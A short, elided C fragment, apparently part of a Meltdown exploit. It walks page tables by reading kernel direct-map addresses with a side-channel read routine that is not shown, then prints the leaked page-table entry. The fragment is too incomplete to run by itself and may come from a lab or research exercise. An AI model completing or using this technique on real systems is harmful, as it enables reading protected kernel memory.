...
int main(int argc, char **argv) {
	...
	// unsigned long long int pgd_val;
	// scanf("%llx", &pgd_val);
	// pgd_val = pgd_val & 0xfffffffffffff000;
	...
	// scanf("%llx", &pud_val);
	// pud_val = pud_val & 0xfffffffffffff000;
	...
	scanf("%llx", &pmd_val);
	pmd_val = pmd_val & 0xfffffffffffff000;
	unsigned long long int pte_val = read_addr_by_meltdown(fd, 0xffff888000000000 + pmd_val + 0x20);
	printf("pte_val: %p\n", pte_val);

	// unsigned long long int pte_val = 0xffff8067 & 0xfffffffffffff000;
